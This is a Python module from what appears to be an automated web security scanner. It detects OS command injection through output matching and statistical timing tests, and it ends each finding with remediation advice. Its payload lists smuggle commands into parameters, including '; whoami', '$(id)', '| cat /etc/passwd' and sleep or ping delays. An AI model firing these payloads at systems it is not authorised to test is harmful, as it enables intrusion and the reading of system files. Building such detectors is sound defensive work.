"""
Command Injection Agent - Detects OS Command Injection vulnerabilities.

Enhanced version with:
- Proper logging (consistent with orchestrator)
- Configuration constants
- Better type safety
- Statistical time-based detection
- Advanced payload encoding
- False positive reduction
- Better error handling
"""
import re
import time
import asyncio
import logging
import statistics
from typing import List, Dict, Any, Optional, Tuple, Set
from urllib.parse import quote
from dataclasses import dataclass
from enum import Enum

from .base_agent import BaseSecurityAgent, AgentResult
from models.vulnerability import Severity, VulnerabilityType
# Configure logging
logger = logging.getLogger(__name__)


class InjectionContext(Enum):
    """Command injection context types."""
    DIRECT = "direct"
    QUOTED = "quoted"
    DOUBLE_QUOTED = "double_quoted"
    BACKTICK = "backtick"
    WINDOWS = "windows"


@dataclass
class PayloadTest:
    """Represents a command injection test payload."""
    payload: str
    indicators: List[str]
    context: InjectionContext
    description: str


@dataclass
class TimingResult:
    """Results from timing-based test."""
    baseline_avg: float
    baseline_std: float
    test_duration: float
    delay_expected: int
    is_vulnerable: bool
    confidence: float


class CommandInjectionConfig:
    """Configuration constants for command injection testing."""

    # Timing analysis
    BASELINE_SAMPLES = 3
    TIME_DELAYS = [3, 5, 7]  # Multiple delays for confirmation
    TIMING_TOLERANCE = 1.5  # seconds tolerance
    TIMING_CONFIDENCE_THRESHOLD = 0.85
    MIN_CONFIRMATIONS = 2  # Require 2 successful timing tests

    # Detection
    MIN_INDICATORS_FOR_CONFIRMATION = 2
    SIMILARITY_THRESHOLD = 0.7
    MAX_PARAMS_TO_TEST = 5  # Limit to avoid excessive requests

    # Timeouts
    REQUEST_TIMEOUT = 10
    MAX_RESPONSE_SIZE = 10000  # bytes

    # Pattern matching
    UID_PATTERN = re.compile(r'uid=\d+\([^)]+\)\s+gid=\d+')
    PASSWD_PATTERN = re.compile(r'root:[x*]:\d+:\d+:[^:]*:[^:]*:[^\n]+')
    WIN_DIR_PATTERN = re.compile(r'\d{2}/\d{2}/\d{4}\s+\d{2}:\d{2}\s+(AM|PM)')
    LINUX_KERNEL_PATTERN = re.compile(r'Linux\s+\S+\s+\d+\.\d+\.\d+')


class CommandInjectionAgent(BaseSecurityAgent):
    """
    OS Command Injection detection agent.

    Tests for:
    - Direct command injection (error-based)
    - Blind command injection (time-based with statistical analysis)
    - Context-aware injection (quoted, unquoted, Windows/Unix)
    - Advanced encoding techniques

    Implements false positive reduction through:
    - Multiple indicator verification
    - Statistical timing analysis
    - Context-specific validation
    - Output pattern recognition
    """

    agent_name = "command_injection"
    agent_description = "Tests for OS Command Injection vulnerabilities with advanced detection"
    vulnerability_types = [VulnerabilityType.OS_COMMAND_INJECTION]

    def __init__(self):
        """Initialize agent with configuration."""
        super().__init__()
        self.config = CommandInjectionConfig()
        self._init_payloads()

    def _init_payloads(self) -> None:
        """Initialize test payloads organized by context."""
        self.error_based_payloads: List[PayloadTest] = [
            # Unix - Unquoted context
            PayloadTest(
                payload="; whoami",
                indicators=["root", "www-data", "apache", "nginx", "node", "admin", "ubuntu"],
                context=InjectionContext.DIRECT,
                description="Semicolon separator with whoami"
            ),
            PayloadTest(
                payload="| id",
                indicators=["uid=", "gid=", "groups="],
                context=InjectionContext.DIRECT,
                description="Pipe with id command"
            ),
            PayloadTest(
                payload="|| id",
                indicators=["uid=", "gid=", "groups="],
                context=InjectionContext.DIRECT,
                description="OR operator with id"
            ),
            PayloadTest(
                payload="&& uname -a",
                indicators=["Linux", "Darwin", "Unix", "BSD", "GNU"],
                context=InjectionContext.DIRECT,
                description="AND operator with uname"
            ),

            # Unix - Command substitution
            PayloadTest(
                payload="`id`",
                indicators=["uid=", "gid="],
                context=InjectionContext.BACKTICK,
                description="Backtick command substitution"
            ),
            PayloadTest(
                payload="$(id)",
                indicators=["uid=", "gid="],
                context=InjectionContext.DIRECT,
                description="Dollar-parenthesis substitution"
            ),

            # Unix - Quoted context escapes
            PayloadTest(
                payload="'; whoami; echo '",
                indicators=["root", "www-data", "apache", "nginx"],
                context=InjectionContext.QUOTED,
                description="Single quote escape"
            ),
            PayloadTest(
                payload='"; id; echo "',
                indicators=["uid=", "gid="],
                context=InjectionContext.DOUBLE_QUOTED,
                description="Double quote escape"
            ),

            # Unix - File reading
            PayloadTest(
                payload="| cat /etc/passwd",
                indicators=["root:", "nobody:", "/bin/bash", "/bin/sh", "nologin"],
                context=InjectionContext.DIRECT,
                description="Read passwd file"
            ),
            PayloadTest(
                payload="| cat /etc/hosts",
                indicators=["localhost", "127.0.0.1", "::1"],
                context=InjectionContext.DIRECT,
                description="Read hosts file"
            ),

            # Windows commands
            PayloadTest(
                payload="& whoami",
                indicators=["\\", "SYSTEM", "Administrator", "NT AUTHORITY"],
                context=InjectionContext.WINDOWS,
                description="Windows AND with whoami"
            ),
            PayloadTest(
                payload="| whoami",
                indicators=["\\", "SYSTEM", "Administrator"],
                context=InjectionContext.WINDOWS,
                description="Windows pipe with whoami"
            ),
            PayloadTest(
                payload="& dir",
                indicators=["Volume", "Directory", "File(s)", "bytes"],
                context=InjectionContext.WINDOWS,
                description="Windows directory listing"
            ),
            PayloadTest(
                payload="| type C:\\Windows\\win.ini",
                indicators=["[fonts]", "[extensions]", "[files]"],
                context=InjectionContext.WINDOWS,
                description="Windows read system file"
            ),
        ]

        # Time-based payloads (template, context)
        self.time_based_payloads: List[Tuple[str, InjectionContext, str]] = [
            # Unix sleep
            ("; sleep {delay}", InjectionContext.DIRECT, "Unix sleep"),
            ("| sleep {delay}", InjectionContext.DIRECT, "Unix sleep with pipe"),
            ("|| sleep {delay}", InjectionContext.DIRECT, "Unix sleep with OR"),
            ("&& sleep {delay}", InjectionContext.DIRECT, "Unix sleep with AND"),
            ("`sleep {delay}`", InjectionContext.BACKTICK, "Unix sleep in backticks"),
            ("$(sleep {delay})", InjectionContext.DIRECT, "Unix sleep in command substitution"),

            # Windows timeout/ping
            ("& ping -n {delay} 127.0.0.1", InjectionContext.WINDOWS, "Windows ping delay"),
            ("| ping -n {delay} 127.0.0.1", InjectionContext.WINDOWS, "Windows ping with pipe"),
            ("& timeout /t {delay}", InjectionContext.WINDOWS, "Windows timeout"),
            ("| timeout /t {delay}", InjectionContext.WINDOWS, "Windows timeout with pipe"),
        ]

    # Parameter patterns likely to be vulnerable
    VULN_PARAM_PATTERNS = [
        r'cmd', r'command', r'exec', r'execute', r'run',
        r'ping', r'host', r'ip', r'addr', r'domain',
        r'query', r'arg', r'param',
        r'file', r'filename', r'path', r'dir', r'folder',
        r'include', r'page', r'url',
        r'daemon', r'process', r'service',
        r'option', r'flag', r'action', r'do', r'op'
    ]

    # URL patterns suggesting command execution
    VULN_URL_PATTERNS = [
        r'/ping', r'/exec', r'/run', r'/cmd', r'/shell',
        r'/system', r'/admin/command', r'/api/execute',
        r'/diagnostic', r'/tools', r'/utils'
    ]

    async def scan(
            self,
            target_url: str,
            endpoints: List[Dict[str, Any]],
            technology_stack: List[str] = None,
            scan_context: Optional[Any] = None
    ) -> List[AgentResult]:
        """
        Scan for command injection vulnerabilities.

        Args:
            target_url: Base URL of the target
            endpoints: List of discovered endpoints
            technology_stack: Detected technologies (used to prioritize Unix vs Windows payloads)
            scan_context: Shared context for inter-agent communication

        Returns:
            List of vulnerability findings
        """
        logger.info(f"[{self.agent_name}] Starting command injection scan on {target_url}")
        results = []
        tested_params: Set[str] = set()

        # Determine if target is likely Windows or Unix
        is_windows = self._detect_windows_target(technology_stack, target_url)
        logger.debug(f"Target OS detection: {'Windows' if is_windows else 'Unix/Linux'}")

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            params = endpoint.get("params", {})
            method = endpoint.get("method", "GET")

            if not params:
                continue

            # Find potentially vulnerable parameters
            vuln_params = self._find_vulnerable_parameters(params, url)

            # Limit testing to avoid excessive requests
            vuln_params = vuln_params[:self.config.MAX_PARAMS_TO_TEST]

            for param_name in vuln_params:
                # Skip if already tested in another endpoint
                param_key = f"{param_name}:{method}"
                if param_key in tested_params:
                    continue
                tested_params.add(param_key)

                logger.debug(f"Testing parameter: {param_name} in {url}")

                # Test error-based injection
                error_result = await self._test_error_based(
                    url, method, params, param_name, is_windows
                )
                if error_result:
                    results.append(error_result)
                    logger.info(f"Found error-based command injection in {param_name}")
                    continue  # Skip time-based if error-based found

                # Test time-based blind injection
                time_result = await self._test_time_based(
                    url, method, params, param_name, is_windows
                )
                if time_result:
                    results.append(time_result)
                    logger.info(f"Found time-based command injection in {param_name}")

        logger.info(f"[{self.agent_name}] Scan complete. Found {len(results)} vulnerabilities")
        return results

    def _detect_windows_target(
            self,
            technology_stack: Optional[List[str]],
            target_url: str
    ) -> bool:
        """Detect if target is likely Windows-based."""
        if not technology_stack:
            return False

        windows_indicators = ['iis', 'asp.net', 'windows', 'microsoft', '.aspx']
        tech_lower = [t.lower() for t in technology_stack]

        return any(indicator in ' '.join(tech_lower) for indicator in windows_indicators)

    def _find_vulnerable_parameters(
            self,
            params: Dict[str, Any],
            url: str
    ) -> List[str]:
        """
        Find parameters that might be vulnerable to command injection.

        Prioritizes parameters based on:
        1. Name matches vulnerability patterns
        2. URL suggests command execution functionality
        3. Parameter value suggests file/command context
        """
        vuln_params = []
        scored_params = []

        url_lower = url.lower()

        for param_name, param_value in params.items():
            score = 0
            param_lower = param_name.lower()

            # Score by parameter name
            for pattern in self.VULN_PARAM_PATTERNS:
                if re.search(pattern, param_lower):
                    score += 10
                    break

            # Score by parameter value context
            if isinstance(param_value, str):
                value_lower = param_value.lower()
                if any(ext in value_lower for ext in ['.sh', '.bat', '.cmd', '.exe', '.bin']):
                    score += 5
                if '/' in value_lower or '\\' in value_lower:
                    score += 3

            # Score by URL patterns
            for pattern in self.VULN_URL_PATTERNS:
                if re.search(pattern, url_lower):
                    score += 7
                    break

            if score > 0:
                scored_params.append((param_name, score))

        # Sort by score and return parameter names
        scored_params.sort(key=lambda x: x[1], reverse=True)
        vuln_params = [p[0] for p in scored_params]

        # If no specific params found, test first few params
        if not vuln_params and params:
            vuln_params = list(params.keys())[:self.config.MAX_PARAMS_TO_TEST]

        return vuln_params

    async def _test_error_based(
            self,
            url: str,
            method: str,
            params: Dict[str, Any],
            param_name: str,
            is_windows: bool
    ) -> Optional[AgentResult]:
        """
        Test for error-based command injection.

        Tries multiple payload contexts and validates output.
        """
        original_value = params.get(param_name, "")

        # Filter payloads by target OS
        payloads = [
            p for p in self.error_based_payloads
            if (is_windows and p.context == InjectionContext.WINDOWS) or
               (not is_windows and p.context != InjectionContext.WINDOWS)
        ]

        for payload_test in payloads:
            test_params = params.copy()
            test_params[param_name] = f"{original_value}{payload_test.payload}"

            try:
                response = await self._make_safe_request(url, method, test_params)

                if not response:
                    continue

                # Check for indicators in response
                found_indicators = [
                    ind for ind in payload_test.indicators
                    if ind in response.text
                ]

                if not found_indicators:
                    continue

                # Verify it's actual command output, not error message
                verification = self._verify_command_output(
                    response.text,
                    found_indicators,
                    payload_test.context
                )

                if not verification["is_real"]:
                    logger.debug(f"False positive filtered: {verification['reason']}")
                    continue

                # Use AI to analyze
                ai_analysis = await self.analyze_with_ai(
                    vulnerability_type="Command Injection",
                    context=f"Parameter: {param_name}\nPayload: {payload_test.payload}\nDescription: {payload_test.description}",
                    response_data=response.text[:1500]
                )

                confidence = min(
                    ai_analysis.get("confidence", 85),
                    verification["confidence"]
                )

                return self.create_result(
                    vulnerability_type=VulnerabilityType.OS_COMMAND_INJECTION,
                    is_vulnerable=True,
                    severity=Severity.CRITICAL,
                    confidence=confidence,
                    url=url,
                    parameter=param_name,
                    method=method,
                    title=f"OS Command Injection in '{param_name}' parameter",
                    description=(
                        f"The '{param_name}' parameter is vulnerable to OS command injection. "
                        f"An attacker can execute arbitrary system commands on the server. "
                        f"Injection context: {payload_test.context.value}"
                    ),
                    evidence=(
                        f"Payload: {payload_test.payload}\n"
                        f"Description: {payload_test.description}\n"
                        f"Indicators found: {found_indicators[:3]}\n"
                        f"Verification: {verification['reason']}"
                    ),
                    request_data={"param": param_name, "payload": payload_test.payload},
                    response_snippet=response.text[:800],
                    ai_analysis=ai_analysis.get("reason", ""),
                    likelihood=9.5,
                    impact=10.0,
                    exploitability_rationale=(
                        "Directly exploitable. Command injection allows:\n"
                        "- Full server compromise and data exfiltration\n"
                        "- Lateral movement to internal systems\n"
                        "- Installation of backdoors and persistence mechanisms\n"
                        "- Denial of service attacks\n"
                        f"- Context: {payload_test.context.value} injection confirmed"
                    ),
                    remediation=(
                        "IMMEDIATE ACTION REQUIRED:\n"
                        "1. NEVER pass user input directly to system commands\n"
                        "2. Use parameterized/safe APIs:\n"
                        "   - Python: subprocess with shell=False and args list\n"
                        "   - Node.js: child_process.execFile() not exec()\n"
                        "   - PHP: escapeshellarg() + escapeshellcmd() or safe libraries\n"
                        "3. Implement strict input validation (allowlist only)\n"
                        "4. Use language-specific safe alternatives (avoid shell execution)\n"
                        "5. Run services with minimal privileges (principle of least privilege)\n"
                        "6. Consider containerization to limit blast radius"
                    ),
                    owasp_category="A03:2021 – Injection",
                    cwe_id="CWE-78"
                )

            except Exception as e:
                logger.error(f"Error testing payload {payload_test.payload}: {e}")

        return None

    async def _test_time_based(
            self,
            url: str,
            method: str,
            params: Dict[str, Any],
            param_name: str,
            is_windows: bool
    ) -> Optional[AgentResult]:
        """
        Test for time-based blind command injection with statistical analysis.

        Uses multiple delay values and statistical methods to reduce false positives.
        """
        original_value = params.get(param_name, "")

        # Establish baseline timing with statistical analysis
        logger.debug(f"Establishing baseline timing for {param_name}")
        baseline = await self._measure_baseline_timing(url, method, params)

        if not baseline:
            logger.warning("Could not establish baseline timing")
            return None

        logger.debug(
            f"Baseline: avg={baseline.baseline_avg:.2f}s, "
            f"std={baseline.baseline_std:.2f}s"
        )

        # Filter payloads by target OS
        payloads = [
            p for p in self.time_based_payloads
            if (is_windows and p[1] == InjectionContext.WINDOWS) or
               (not is_windows and p[1] != InjectionContext.WINDOWS)
        ]

        confirmations = []

        # Test with multiple delays
        for delay in self.config.TIME_DELAYS:
            for payload_template, context, description in payloads:
                payload = payload_template.format(delay=delay)

                timing_result = await self._test_single_timing(
                    url, method, params, param_name, payload,
                    delay, baseline.baseline_avg, baseline.baseline_std
                )

                if timing_result and timing_result.is_vulnerable:
                    confirmations.append((timing_result, payload, context, description))
                    logger.debug(
                        f"Timing anomaly detected: {timing_result.test_duration:.2f}s "
                        f"(expected ~{delay}s delay)"
                    )

        # Require multiple confirmations to reduce false positives
        if len(confirmations) >= self.config.MIN_CONFIRMATIONS:
            # Use the highest confidence result
            best_result = max(confirmations, key=lambda x: x[0].confidence)
            timing_result, payload, context, description = best_result

            avg_confidence = statistics.mean([c[0].confidence for c in confirmations])

            return self.create_result(
                vulnerability_type=VulnerabilityType.OS_COMMAND_INJECTION,
                is_vulnerable=True,
                severity=Severity.CRITICAL,
                confidence=int(avg_confidence * 100),
                url=url,
                parameter=param_name,
                method=method,
                title=f"Blind Command Injection in '{param_name}' (Time-based)",
                description=(
                    f"The '{param_name}' parameter is vulnerable to blind command injection. "
                    f"Confirmed via statistical time-based analysis with {len(confirmations)} "
                    f"successful confirmations. Context: {context.value}"
                ),
                evidence=(
                    f"Payload: {payload}\n"
                    f"Description: {description}\n"
                    f"Baseline timing: {baseline.baseline_avg:.2f}s (±{baseline.baseline_std:.2f}s)\n"
                    f"Test duration: {timing_result.test_duration:.2f}s\n"
                    f"Expected delay: ~{timing_result.delay_expected}s\n"
                    f"Confirmations: {len(confirmations)}/{len(self.config.TIME_DELAYS) * len(payloads)} tests\n"
                    f"Average confidence: {avg_confidence:.2%}"
                ),
                request_data={"param": param_name, "payload": payload},
                likelihood=9.0,
                impact=10.0,
                exploitability_rationale=(
                    f"Blind command injection confirmed with high confidence ({avg_confidence:.0%}). "
                    "Despite lack of direct output, attacker can:\n"
                    "- Exfiltrate data via DNS queries or HTTP callbacks\n"
                    "- Extract data byte-by-byte using time-based techniques\n"
                    "- Create reverse shells for interactive access\n"
                    "- Execute any system command with server privileges\n"
                    f"- Statistical analysis with {len(confirmations)} confirmations reduces false positive risk"
                ),
                remediation=(
                    "IMMEDIATE ACTION REQUIRED:\n"
                    "1. NEVER pass user input directly to system commands\n"
                    "2. Use parameterized APIs without shell execution\n"
                    "3. Implement strict input validation (allowlist approach)\n"
                    "4. Use language-specific safe alternatives\n"
                    "5. Run with minimal privileges\n"
                    "6. Monitor for time-based attack patterns in WAF/IDS"
                ),
                owasp_category="A03:2021 – Injection",
                cwe_id="CWE-78"
            )

        return None

    async def _measure_baseline_timing(
            self,
            url: str,
            method: str,
            params: Dict[str, Any]
    ) -> Optional[TimingResult]:
        """Measure baseline response time with statistical analysis."""
        baseline_times = []

        for i in range(self.config.BASELINE_SAMPLES):
            try:
                start = time.time()
                response = await self._make_safe_request(url, method, params)
                elapsed = time.time() - start

                if response:
                    baseline_times.append(elapsed)

            except Exception as e:
                logger.debug(f"Baseline measurement {i + 1} failed: {e}")

        if len(baseline_times) < 2:
            return None

        avg = statistics.mean(baseline_times)
        std = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0

        return TimingResult(
            baseline_avg=avg,
            baseline_std=std,
            test_duration=0,
            delay_expected=0,
            is_vulnerable=False,
            confidence=0
        )

    async def _test_single_timing(
            self,
            url: str,
            method: str,
            params: Dict[str, Any],
            param_name: str,
            payload: str,
            expected_delay: int,
            baseline_avg: float,
            baseline_std: float
    ) -> Optional[TimingResult]:
        """Test a single timing payload and analyze results."""
        original_value = params.get(param_name, "")
        test_params = params.copy()
        test_params[param_name] = f"{original_value}{payload}"

        try:
            start = time.time()
            response = await self._make_safe_request(url, method, test_params)
            elapsed = time.time() - start

            if not response:
                return None

            # Calculate expected timing range
            expected_min = baseline_avg + expected_delay - self.config.TIMING_TOLERANCE
            expected_max = baseline_avg + expected_delay + self.config.TIMING_TOLERANCE

            # Check if timing matches expected delay
            is_in_range = expected_min <= elapsed <= expected_max

            # Calculate confidence based on how well timing matches
            if is_in_range:
                # Perfect match = 1.0, edges = threshold
                center = baseline_avg + expected_delay
                deviation = abs(elapsed - center)
                max_deviation = self.config.TIMING_TOLERANCE
                confidence = max(
                    self.config.TIMING_CONFIDENCE_THRESHOLD,
                    1.0 - (deviation / max_deviation) * (1.0 - self.config.TIMING_CONFIDENCE_THRESHOLD)
                )
            else:
                confidence = 0

            return TimingResult(
                baseline_avg=baseline_avg,
                baseline_std=baseline_std,
                test_duration=elapsed,
                delay_expected=expected_delay,
                is_vulnerable=is_in_range,
                confidence=confidence
            )

        except Exception as e:
            logger.debug(f"Timing test error: {e}")
            return None

    async def _make_safe_request(
            self,
            url: str,
            method: str,
            params: Dict[str, Any]
    ) -> Optional[Any]:
        """Make a request with safety limits."""
        try:
            if method.upper() == "GET":
                response = await asyncio.wait_for(
                    self.make_request(url, params=params),
                    timeout=self.config.REQUEST_TIMEOUT
                )
            else:
                response = await asyncio.wait_for(
                    self.make_request(url, method=method, data=params),
                    timeout=self.config.REQUEST_TIMEOUT
                )

            # Limit response size
            if response and len(response.text) > self.config.MAX_RESPONSE_SIZE:
                response.text = response.text[:self.config.MAX_RESPONSE_SIZE]

            return response

        except asyncio.TimeoutError:
            logger.debug(f"Request timeout to {url}")
            return None
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return None

    def _verify_command_output(
            self,
            response_text: str,
            indicators: List[str],
            context: InjectionContext
    ) -> Dict[str, Any]:
        """
        Verify that the response contains actual command output.

        Returns:
            Dict with 'is_real' (bool), 'confidence' (int), 'reason' (str)
        """
        # Count indicator matches
        matches = len(indicators)

        # Strong evidence patterns
        strong_matches = 0
        reasons = []

        # Check for uid= pattern from 'id' command
        if self.config.UID_PATTERN.search(response_text):
            strong_matches += 1
            reasons.append("Found complete uid/gid output format")

        # Check for /etc/passwd format
        if self.config.PASSWD_PATTERN.search(response_text):
            strong_matches += 1
            reasons.append("Found /etc/passwd entry format")

        # Check for Windows directory listing
        if self.config.WIN_DIR_PATTERN.search(response_text):
            strong_matches += 1
            reasons.append("Found Windows directory listing format")

        # Check for Linux kernel info
        if self.config.LINUX_KERNEL_PATTERN.search(response_text):
            strong_matches += 1
            reasons.append("Found Linux kernel version format")

        # False positive indicators
        error_indicators = [
            "error", "exception", "stack trace", "warning",
            "invalid", "failed", "denied", "forbidden"
        ]
        has_errors = any(err in response_text.lower() for err in error_indicators)

        # Calculate confidence
        if strong_matches >= 2:
            confidence = 95
            is_real = True
            reason = f"Strong patterns: {'; '.join(reasons)}"
        elif strong_matches == 1 and matches >= 2:
            confidence = 85
            is_real = True
            reason = f"Strong pattern + multiple indicators: {'; '.join(reasons)}"
        elif matches >= self.config.MIN_INDICATORS_FOR_CONFIRMATION and not has_errors:
            confidence = 75
            is_real = True
            reason = f"Multiple indicators ({matches}) without error context"
        elif has_errors:
            confidence = 30
            is_real = False
            reason = "Response contains error indicators, likely false positive"
        else:
            confidence = 40
            is_real = False
            reason = f"Insufficient evidence (only {matches} indicators)"

        return {
            "is_real": is_real,
            "confidence": confidence,
            "reason": reason
        }